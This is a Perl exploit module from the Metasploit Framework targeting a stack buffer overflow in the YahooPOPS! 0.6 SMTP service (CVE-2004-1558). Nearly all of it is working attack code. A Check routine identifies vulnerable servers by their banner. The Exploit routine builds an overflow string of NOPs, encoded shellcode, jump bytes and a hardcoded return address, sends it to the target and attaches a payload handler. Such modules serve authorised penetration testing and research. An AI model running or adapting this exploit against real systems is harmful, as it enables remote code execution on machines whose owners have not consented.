##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ypops_smtp;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
  };

my $info = {
	'Name'    => 'YahooPOPS! <= 0.6 SMTP Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => [ 'y0 <y0 [at] w00t-shell.net>', ],
	'Arch'    => [ 'x86' ],
	'OS'      => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
	'Priv'    => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 25],
	  },

	'AutoOpts'  => { 'EXITFUNC'  => 'process' },
	'Payload' =>
	  {
		'Space'     => 400,
		'BadChars'  => "\x00+&=%\x0a\x0d\x20",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
This module exploits a stack based buffer overflow in YPOPS! 0.6 SMTP service.
By sending a SMTP message containing more than 504 bytes, a remote attacker 
could overflow a buffer and execute arbitrary code on the system or cause 
the SMTP service to crash.


}),

	'Refs'  =>
	  [
		['BID', '11256'],
		['CVE', '2004-1558'],
	  ],

	'Targets' =>
	  [
		['YPOPs! <= 0.6 Universal', 0x10019f97],
	  ],

	'DefaultTarget' => 0,

	'Keys' => ['smtp'],

	'DisclosureDate' => 'September 27 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("QUIT\r\n");
	my $res = $s->Recv(-1, 20);
	$s->Close();

	if ($res !~ /YahooPOPs! Simple Mail/) {
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] Vulnerable installation detected :-)");
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self = shift;
	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload->Payload;
	my $target = $self->Targets->[$targetIndex];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
	
	my $sock = Msf::Socket::Tcp->new(
		'PeerAddr' => $targetHost,
		'PeerPort' => $targetPort,
	  );

	if($sock->IsError) {
		$self->PrintLine('Error creating socket: ' . $sock->GetError);
		return;
	}

	my $resp = $sock->Recv(-1, 3);
	chomp($resp);
	
	$self->PrintLine('[*] Got Banner: ' . $resp);
	
	my $resp = $sock->Recv(-1, 3);
	if($sock->IsError) {
		$self->PrintLine('Socket error: ' . $sock->GetError);
		return;
	}

	$self->PrintLine('[*] Sending overflow...');

	my $sploit =
	  $self->MakeNops(200). $shellcode. $self->MakeNops(43).
	  "\xeb\x06\x92\x46". pack('V', $target->[1]).
	  $self->MakeNops(8). ("\xeb\x08\x46\x92" x 50);

	my $resp = $sock->Recv(-1, 3);
	if(length($resp)) {
		$self->PrintLine('[*] Got response, bad: ' . $resp);
	}

	$sock->Send($sploit);
	$self->Handler($sock);
	$sock->Close();
	return;
}

1;
